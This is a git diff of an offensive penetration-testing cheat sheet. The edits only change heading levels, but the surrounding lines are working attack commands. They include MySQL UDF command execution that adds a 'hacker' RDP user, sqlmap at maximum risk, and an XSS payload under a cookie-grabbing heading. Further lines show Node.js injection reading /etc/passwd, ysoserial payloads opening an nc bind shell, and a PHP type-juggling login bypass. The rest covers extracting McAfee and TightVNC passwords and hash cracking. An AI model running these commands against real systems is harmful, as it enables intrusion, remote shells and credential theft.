     SELECT something FROM tableA A FULL OUTER JOIN tableB B ON A.KEY = B.KEY
@@ -2466,7 +2466,7 @@ Telnet Brute
 
 ```
 
-### MySQL
+#### MySQL
 ```
     [mysqldir]/bin/mysql-h hostname-u root --password=pass <database>
 
@@ -2480,7 +2480,7 @@ Telnet Brute
     mysql> SELECT * FROM [table name];
 ```
 
-#### UDF Install for Command Execution
+##### UDF Install for Command Execution
 
 User Defined Functions by Platform
 ``` 
@@ -2523,14 +2523,14 @@ Load MYSQLUDFfor Windows
     s_exec('net localgroup"Remote Desktop Users" hacker /add');
 ```
 
-### SQLMap
+#### SQLMap
 
 Automated website crawl and test of SQLi
 ```
     python sqlmap.py -u http://example.com --forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3
 ```
 
-## XSS 
+### XSS 
 
 Grab cookie
 ``` 
@@ -2542,7 +2542,7 @@ XSS via image tag
     <img src="x" onerror="alert('Suck it, Trebek!')" />
 ```
 
-## Server-side Javascript Injection via Node or ElementJS
+### Server-side Javascript Injection via Node or ElementJS
 
 File system directory listing
 ``` 
@@ -2554,7 +2554,7 @@ File read
     res.end(require('fs').readFileSync('/etc/passwd').toString())
 ```
 
-## Cold Fusion
+### Cold Fusion
 
 Sources:
 [JMPESPJUMP - Attacking Adobe Cold Fusion](https://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html)
@@ -2580,9 +2580,9 @@ Sources:
 - [ColdFusion_Install_Dir]\lib\neo-datasource.xml
 
 
-## Java
+### Java
 
-### JBOSS
+#### JBOSS
 
 Default credential is "admin:admin"
 ```
@@ -2614,7 +2614,7 @@ Auto-check and exploitation tool (https://github.com/joaomatosf/jexboss)
     python jexboss.py -host http://target_host:8080
 ```
 
-## Java Deserialization
+### Java Deserialization
 
 [Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
 
@@ -2635,7 +2635,7 @@ Generate a ysoserial payload to execute nc bind shell
     java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'sh -c $@|sh . nc -lp 8088 -e /bin/bash' > nc-jenkins.out
 ```
 
-### JMXInvokerServlet
+#### JMXInvokerServlet
 ```
     ./ysoserial-master-v0.0.4-gad26e2b-61.jar CommonsCollections5 "touch /tmp/pwned" >payload.txt
 ```
@@ -2650,7 +2650,7 @@ Ensure the headers match these:
     Content-Length: 2083
 ```
 
-### PHP
+#### PHP
 
 LFI Read File (without executing)
 ```
@@ -2675,13 +2675,13 @@ PHP Command Execution Example
     @die ($page($help));
 ```
 
-#### PHP Type Juggling
+##### PHP Type Juggling
 
 Bypass login authentication with PHP Type juggling by forcing a null condition in a string comparison. 
 
 Add [] after a POST parameter "?user_id[]=user22" to force a NULL (zero-like) condition when comparing a string and an array
 
-### Web Sockets
+#### Web Sockets
 
 There are still relatively few dec ent Web Socket testing tools and most aren't very mature:
 
@@ -2690,17 +2690,17 @@ There are still relatively few dec ent Web Socket testing tools and most aren't 
 * [WSSiP](https://github.com/nccgroup/wssip)- WebSocket Manipulation Proxy - Application for capturing, modifying and sending custom WebSocket data from client to server and vice versa.
 
 
-# Misc
+## Misc
 
 Things that don't seem to fit elsewhere!
 
 
-### Decompiling .NET Binaries
+#### Decompiling .NET Binaries
 
 http://ilspy.net/
 
 
-### Canary Tokens
+#### Canary Tokens
 
 Tokens consist of a unique identifier (which can be embedded in either HTTP URLs or in hostnames.) Whenever that URL is requested, or the hostname is resolved, we send a notification email to the address tied to the token. You can get one in seconds, using just your browser.
 
@@ -2714,7 +2714,7 @@ To obtain a token:
 ```
 [Canarytokens.org](https://canarytokens.org/generate#)
 
-### Python SSL Web Server
+#### Python SSL Web Server
 
 Create PEM file
 ```
@@ -2736,7 +2736,7 @@ Python code
     httpd.serve_forever()
 ```
 
-### McAfee SiteList.xml decryption
+#### McAfee SiteList.xml decryption
 Sometimes DA and other admin level account passwords are stored in Sitelist.xml files on local hosts
 ```
     type "C:\ProgramData\McAfee\Common Framework\SiteList.xml" |findstr Password
@@ -2752,7 +2752,7 @@ https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/prives
 git clone https://github.com/funoverip/mcafee-sitelist-pwd-decryption
 ```
 
-### TightVNC Password Retrieval
+#### TightVNC Password Retrieval
 
 Retrieve TightVNC registry keys
 ```
@@ -2770,11 +2770,11 @@ Download vncpwd.exe or other VNC password decoder
     wine vncpwd.exe 7228098734BBBA06
 ```
 
-### Password Lists
+#### Password Lists
 
 https://github.com/danielmiessler/SecLists.gits
 
-### AIX Passwords
+#### AIX Passwords
 
 /etc/security/passwd
 
@@ -2783,12 +2783,12 @@ Convert AIX passwd file to john format
     cat $1|egrep ":|password" | sed 's/password = //g' | tr -d "\t " |sed ':a;N;$!ba;s/:\n/:/g'
 ```
 
-### Create NTLM Hash from Mac CLI
+#### Create NTLM Hash from Mac CLI
 ```
     echo -n password | iconv -t UTF-16LE | openssl md4
 ```
 
-### Hash Cracking Examples
+#### Hash Cracking Examples
 ophcrack using tables
 ```
     ophcrack -d /Volumes/data/table_vista_free/ -t /Volumes/data/table_vista_free -f ~/Desktop/ntlm.hashdump
@@ -2809,7 +2809,7 @@ JTR SPNs with wordlist
     ./john --format=krb5tgs spns.dump --wordlist=
 ```
 
-### Magic Hashes
+#### Magic Hashes
 
 Source: https://www.whitehatsec.com/blog/magic-hashes/
 
